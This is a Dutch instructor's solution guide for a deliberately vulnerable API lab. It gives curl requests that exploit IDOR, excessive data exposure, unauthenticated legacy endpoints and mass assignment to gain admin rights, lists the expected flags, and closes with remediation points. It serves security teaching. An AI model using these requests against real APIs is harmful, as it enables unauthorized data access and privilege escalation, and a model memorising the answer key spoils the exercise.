# Docenten-handleiding

Niet aan studenten uitdelen. Dit document bevat de oplossingen en verwachte vondsten.

## Voorbereiding

```bash
python scripts/seed_db.py
uvicorn app.main:app --reload
```

Basisaccount voor oefeningen: `sanne` / `welkom123`.

## Kwetsbaarheid 1: BOLA / IDOR

Login als Sanne en vraag eerst het eigen profiel of eigen cijfers op. Pas daarna het ID in de URL aan.

Voorbeelden:

```bash
curl -s http://127.0.0.1:8000/api/v2/users/102 \
  -H 'Authorization: Bearer <TOKEN>'
```

```bash
curl -s http://127.0.0.1:8000/api/v2/users/102/grades \
  -H 'Authorization: Bearer <TOKEN>'
```

Verwachte vondsten:

| Locatie | Vondst |
| --- | --- |
| `GET /api/v2/users/102` | `FLAG{idor_milan_profile_found}` in `internal_notes` |
| `GET /api/v2/users/102/grades` | `FLAG{grades_bola_private_feedback}` in `private_feedback` |

## Kwetsbaarheid 2: Excessive Data Exposure

Een normale lijst-call geeft meer terug dan een frontend nodig heeft.

Voorbeelden:

```bash
curl -s http://127.0.0.1:8000/api/v2/users \
  -H 'Authorization: Bearer <TOKEN>'
```

```bash
curl -s http://127.0.0.1:8000/api/v2/courses \
  -H 'Authorization: Bearer <TOKEN>'
```

Verwachte vondsten:

| Locatie | Vondst |
| --- | --- |
| `GET /api/v2/users` | Plaintext wachtwoorden, recovery codes, `is_admin`, interne notities |
| `GET /api/v2/users` | `FLAG{excessive_user_dump}` bij admin-notities |
| `GET /api/v2/courses` | `internal_budget_code` en `exam_answer_key` |
| `GET /api/v2/courses` | `FLAG{course_answer_key_leak}` |

## Kwetsbaarheid 3: Improper Assets Management / Shadow API

Oude of ontwikkelroutes staan buiten de studentdocumentatie en hebben geen authenticatie.

Voorbeelden:

```bash
curl -s http://127.0.0.1:8000/api/v1/admin/export
```

```bash
curl -s http://127.0.0.1:8000/api/dev/users
```

Verwachte vondsten:

| Locatie | Vondst |
| --- | --- |
| `/api/v1/admin/export` | Volledige database-export inclusief sessies en config |
| `/api/v1/admin/export` | `FLAG{legacy_shadow_api_found}` in audit events |
| `/api/v1/admin/export` | `FLAG{legacy_export_leaks_config}` in system config |
| `/api/dev/users` | Plaintext gebruikersdump zonder token |

## Kwetsbaarheid 4: Mass Assignment

De update-route accepteert extra velden uit de JSON-body en schrijft die direct naar de database.

Voorbeeld:

```bash
curl -s -X PUT http://127.0.0.1:8000/api/v2/users/101 \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{"full_name":"Sanne de Vries","is_admin":true,"role":"administrator"}'
```

Daarna kan dezelfde token admin-data ophalen:

```bash
curl -s http://127.0.0.1:8000/api/v2/admin/overview \
  -H 'Authorization: Bearer <TOKEN>'
```

Verwachte vondst:

| Locatie | Vondst |
| --- | --- |
| `GET /api/v2/admin/overview` | Secret config, audit events en hint `Mass assignment kan is_admin wijzigen.` |

## Bespreekpunten na de oefening

1. Object-level autorisatie moet per resource worden afgedwongen, niet alleen op login-niveau.
2. API-responses moeten expliciete responsemodellen gebruiken en geen database-records dumpen.
3. Oude API-versies en dev-endpoints horen achter dezelfde controls of moeten verwijderd worden.
4. Update-routes moeten allowlists gebruiken voor publieke velden en server-side privileges negeren.
5. Plaintext wachtwoorden en herstelcodes zijn nooit acceptabel buiten een bewust labscenario.
